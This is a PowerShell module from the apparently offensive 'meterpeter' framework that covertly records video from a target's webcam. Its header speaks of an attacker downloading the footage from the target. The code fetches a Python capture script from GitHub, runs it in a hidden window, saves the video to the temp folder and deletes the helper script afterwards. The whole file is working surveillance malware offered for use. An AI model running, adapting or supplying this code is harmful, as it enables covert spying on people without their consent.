<#
.SYNOPSIS
   Capture video (AVI) using default webcam

   Author: @r00t-3xp10it
   Credits: @AHLASaad \ @AvinabSaha
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: python3 {opencv-python}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.12 that uses opencv-python to record
   a video file (AVI format) using the default camera attached to the computer.

.NOTES
   Remark: recording of webcam turns 'on' the camera ligth.
   Parameter RecTime accepts values from 5 seconds (minimum) up to 60 seconds (max)
   to prevent the AVI file to be very large if attacker needs to download it from target.
   Alternatively -BypassTimer 'true' parameter can be used to bypass rec time restriction.

.Parameter RecTime
   The amount of time to rec in seconds (default: 10)

.Parameter WorkingDir
   Cmdlet working directory (default: $Env:TMP)

.Parameter AutoView
   Auto-start AVI after finish? (default: false)

.Parameter BypassTimmer
   Bypass rectime restriction? (default: false)

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -RecTime '15'
   Record webcam live stream for 15 seconds time

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -WorkingDir "$Env:TMP"
   Record webcam live and use %TMP% as working directory

.EXAMPLE
   PS C:\> .\Invoke-WebCamAvi.ps1 -AutoView 'true'
   Record webcam live and auto-start AVI file after finish?

.INPUTS
   None. You cannot pipe objects into Invoke-WebCamAvi.ps1

.OUTPUTS
   * Recording webcam live in avi format.
     + Downloading python script from github.
     + Starting live capture for '10' seconds.
     + Comverting webcam raw data to AVI format.
   * Storage: 'C:\Users\pedro\AppData\Local\Temp\outpy.avi'

.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/r00t-3xp10it/redpill/tree/main/lib/WebCam-Capture
   https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$WorkingDir="$Env:TMP",
   [string]$BypassTimmer="false",
   [string]$AutoView="False",
   [int]$RecTime='10'
)


$cmdletver = "v1.0.1"
$StartPath = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
write-host "`n* " -ForegroundColor Green -NoNewline
write-host "Recording webcam live in avi format." -ForegroundColor Green

#Check if Python3 its installed
$pythonTest = [bool](python3 -V)
If($pythonTest -iNotMatch 'True')
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Module requires python3 installed.`n" -ForegroundColor Red
   return
}

#Make sure opencv-python its installed
Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](pip3 list|findstr /C:`"opencv-python`") > opencv.log" -Wait
If(-not(Test-Path -Path "opencv.log"))
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "module failed to create opencv.log.`n" -ForegroundColor Red
   return
}

Remove-Item -Path "opencv.log" -Force
$OPenCVTest = Get-Content -Path "opencv.log"
If($OPenCVTest -iNotMatch 'True')
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Module requires opencv-python installed." -ForegroundColor Red
   ## Install opencv and numpy python modules
   # Remark: This will not work remote because requires user acceptance
   pip3 install opencv-python
}

If(Test-Path -Path "$WorkingDir\outpy.avi")
{
   #Delete old avi file
   Remove-Item -Path "$WorkingDir\outpy.avi" -Force
}

If($BypassTimmer -ieq "false")
{
   If($RecTime -gt 60 -or $RecTime -lt 5)
   {
      write-host "  x " -ForegroundColor Red -NoNewline
      write-host "Error: " -ForegroundColor DarkGray -NoNewline
      write-host "RecTime wrong config, default to 10 sec." -ForegroundColor DarkYellow
      [int]$RecTime = '10'
   }
}


#Download python script from github
write-host "  + " -ForegroundColor DarkYellow -NoNewline
write-host "Downloading python script from github."
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "$WorkingDir\WebCam.py"|Unblock-File


#Config python script
$ReplaceMe = Get-Content -Path "$WorkingDir\WebCam.py"
$MyPath = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Programs" -Recurse -Force|Where-Object {$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}).FullName
If(-not($MyPath))
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host "Error: " -ForegroundColor DarkGray -NoNewline
   write-host "Python3 site-packages directory not found.`n" -ForegroundColor Red
   return
}

#replace path in python script
$ReplaceMe = $MyPath -replace '\\','\\'
((Get-Content -Path "$WorkingDir\WebCam.py" -Raw) -Replace "c:\\\\users\\\\pedro\\\\appdata\\\\local\\\\programs\\\\python\\\\python39\\\\lib\\\\site-packages","$ReplaceMe")|Set-Content -Path $WorkingDir\WebCam.py


cd $WorkingDir
#Start live capture
write-host "  + " -ForegroundColor DarkYellow -NoNewline
write-host "Starting live capture for '" -NoNewline
write-host "$RecTime" -ForegroundColor DarkGreen -NoNewline
write-host "' seconds."
Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"

## Config the capture start
# time counting with 1 sec delay
[int]$RecTime = $RecTime+1

Start-Sleep -Seconds $RecTime
#Stop capture after sellected time
Stop-Process -Name "python3.*" -Force


write-host "  + " -ForegroundColor DarkYellow -NoNewline
write-host "Comverting webcam raw data to AVI format."

Start-Sleep -Seconds 7 #Give some time to allow avi to finish
Remove-Item -Path "$WorkingDir\WebCam.py" -Force
write-host "* " -ForegroundColor Green -NoNewline
write-host "Storage: '" -ForegroundColor DarkGray -NoNewline
write-host "$WorkingDir\outpy.avi" -ForegroundColor Green -NoNewline
write-host "'" -ForegroundColor DarkGray


If($AutoView -ieq "true")
{
   #Auto-Start video file
   write-host "* " -ForegroundColor Green -NoNewline
   write-host "[local]: Auto-Start of AVI video file."
   Start-Process "$WorkingDir\outpy.avi"
}

write-host ""
cd $StartPath
exit